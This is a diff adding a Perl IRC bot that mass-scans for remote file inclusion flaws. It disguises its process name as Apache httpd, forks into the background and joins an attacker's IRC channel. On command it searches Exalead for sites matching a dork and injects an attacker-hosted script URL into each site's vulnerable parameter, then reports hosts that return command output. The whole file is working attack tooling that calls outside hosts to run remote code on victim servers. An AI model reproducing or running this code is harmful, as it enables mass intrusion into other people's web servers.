@@ -1,0 +1,175 @@
+#!/usr/bin/perl 
+
+
+use IO::Socket::INET; 
+use HTTP::Request; 
+use LWP::UserAgent;
+#my $processo = "httpd -XXfdL"; 
+my $processo = "/usr/local/apache/bin/httpd -UdgwxzjhydfRL"; 
+if (`ps aux` =~ /httpd -fUdgrfwxRL/){exit;}        
+my $cmd="http://h1317070.stratoserver.net/cmd/scheck.txt?"; 
+my $evalrep="http://gujewear.com/bemarket/goods/qmono/Q-MoNoR6.txt???";
+my $server="217.172.161.183"; 
+my $porta="6667"; 
+my $nick="[LINUXrlz][".int(rand(1000))."]";
+my $canale="#r0x"; 
+my $loger="#r0x"; 
+my $server2="217.172.161.183"; 
+my $port2="6667"; 
+my $verbot="6.9"; 
+$0="$processo"."\0"x16; 
+my $pid=fork; 
+exit if $pid; 
+die "Problem with fork!: $!" unless defined($pid);
+my $sk = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$server", PeerPort=>"$porta",) or die "Cannot connect to server!\n"; 
+$sk->autoflush(1); 
+print $sk "NICK $nick\r\n"; 
+print $sk "USER u0x X * :7Powered by uyx\r\n"; 
+print $sk "JOIN $canale\r\n";
+print $sk "PRIVMSG $canale :15(7@2RFI SCAN ONLINE15)(12!scan IS ON! 7$canale 15)(12Powered by uyx15)(2Random site 4Desactived15)";
+while($line = <$sk>){
+print $line;
+$line =~ s/\r\n$//;
+if ($line=~ /^PING \:(.*)/){
+print "PONG :$1";
+print $sk "PONG :$1\r\n";}
+if ($line =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
+my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
+if ($args =~ /^\001VERSION\001$/) {
+stampa($sk, "NOTICE $pn :\001VERSION XChat 2.6.7 \001");}
+if ($line =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
+print $sk "JOIN $canale\r\n";}
+
+if ($line=~ /PRIVMSG $canale :!scan\s+(.*?)\s+(.*)/){ 
+if (my $pid = fork) { 
+waitpid($pid, 0); 
+} else { 
+if (fork) { 
+exit; 
+} else { 
+my $bug=$1; 
+my $dork=$2; 
+if ($bug =~ /=/) {} 
+else { 
+stampa($sk, "PRIVMSG $canale :7@12WRONG SCAN");exit;}
+my $contatore=0; 
+my ($type,$space); 
+my %hosts; 
+stampa($sk, "PRIVMSG $canale :15(7@2Scan15)(2Searching12 $bug 7/12 $dork 12Random site: 4Desactived15)"); 
+my @exa=&exland($dork); 
+
+stampa($sk, "PRIVMSG $canale :15(7@2Scaned15)(12 $bug 7/12 $dork 15)(2Random site 4Desactived15)");
+stampa($sk, "PRIVMSG $canale :15(7@2Scaned15)(12Exalead ".scalar(@exa)."15)");
+
+push(my @tot,@exa); 
+stampa($sk, "PRIVMSG $canale :15(7@2Scaned15)(12Total sites found7 ".scalar(@tot)."15)");
+my @puliti=&unici(@tot); 
+stampa($sk, "PRIVMSG $canale :15(7@2Scaned15)(12Sucked Sites7 ".scalar(@puliti)."15)");
+my $uni=scalar(@puliti); 
+foreach my $sito (@puliti){ 
+$contatore++; 
+if ($contatore %100==0){} 
+if ($contatore==$uni-1){
+stampa($sk, "PRIVMSG $canale :15(7@2Scan15)(12Finished for7 $dork 15)");
+} 
+my $test="http://".$sito.$bug.$cmd."????"; 
+my $print="http://".$sito.$bug."$evalrep"."????"; 
+my $req=HTTP::Request->new(GET=>$test); 
+my $ua=LWP::UserAgent->new(); 
+$ua->timeout(5); 
+my $response=$ua->request($req); 
+if ($response->is_success) { 
+my $re=$response->content; 
+
+if($re =~ /bypassrulz/ && $re =~ /uid=/){ 
+stampa($sk, "PRIVMSG $canale :15(7@12Vulnerable15)(4OFF15)12 $print 15)");
+stampa($sk, "PRIVMSG $loger :15(7@12Vulnerable15)(4OFF15)12 $print 15)");
+}
+
+elsif($re =~ /bypassrulz/ && $re =~ /windowsrulz/)
+{
+stampa($sk, "PRIVMSG $canale :15(7@12Vulnerable15)15(10Windows15):12 $print 15)");
+stampa($sk, "PRIVMSG $loger :15(7@12Vulnerable15)15(10Windows15):12 $print 15)");
+}
+
+elsif($re =~ /bypassrulz/){
+stampa($sk, "PRIVMSG $canale :15(7@12Vulnerable15)(3ON15)12 $print 15)");
+stampa($sk, "PRIVMSG $loger :15(7@12Vulnerable15)(3ON15)12 $print 15)");
+}
+
+}}}exit;}}}
+sub stampa() { 
+if ($#_ == '1') { 
+my $sk = $_[0]; 
+print $sk "$_[1]\n"; 
+} else { 
+print $sk "$_[0]\n";}}
+
+
+sub exland(){ 
+my @lst; 
+my $key = $_[0]; 
+for($b=0;$b<=1000;$b+=10){ 
+my $Go=("http://www.exalead.com/search/results?q=".key($key)."&b=$b&$rcexpanded=false"); 
+my $Res=query($Go); 
+while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){ 
+if ($1 !~ /google/){ 
+my $k=$1; 
+my @grep=links($k); 
+push(@lst,@grep);}}} 
+return @lst;} 
+
+sub links(){ 
+my @l; 
+my $link=$_[0]; 
+my $host=$_[0]; 
+my $hdir=$_[0]; 
+$hdir=~s/(.*)\/[^\/]*$/\1/; 
+$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/; 
+$host.="/"; 
+$link.="/"; 
+$hdir.="/"; 
+$host=~s/\/\//\//g; 
+$hdir=~s/\/\//\//g; 
+$link=~s/\/\//\//g; 
+push(@l,$link,$host,$hdir); 
+return @l;} 
+sub geths(){ 
+my $host=$_[0]; 
+$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/; 
+return $host;} 
+sub key(){ 
+my $chiave=$_[0]; 
+$chiave =~ s/ /\+/g; 
+$chiave =~ s/:/\%3A/g; 
+$chiave =~ s/\//\%2F/g; 
+$chiave =~ s/&/\%26/g; 
+$chiave =~ s/\"/\%22/g; 
+$chiave =~ s/,/\%2C/g; 
+$chiave =~ s/\\/\%5C/g; 
+return $chiave;} 
+
+sub query($){ 
+my $url=$_[0]; 
+$url=~s/http:\/\///; 
+my $host=$url; 
+my $query=$url; 
+my $page=""; 
+$host=~s/href=\"?http:\/\///; 
+$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/; 
+$query=~s/$host//; 
+if ($query eq "") {$query="/";}; 
+eval{ 
+my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return; 
+print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n"; 
+my @r = <$sock>; 
+$page="@r"; 
+close($sock);}; 
+return $page;} 
+sub unici{ 
+my @unici = (); 
+my %visti = (); 
+foreach my $elemento ( @_ ){ 
+next if $visti{ $elemento }++; 
+push @unici, $elemento;}    
+return @unici;}}
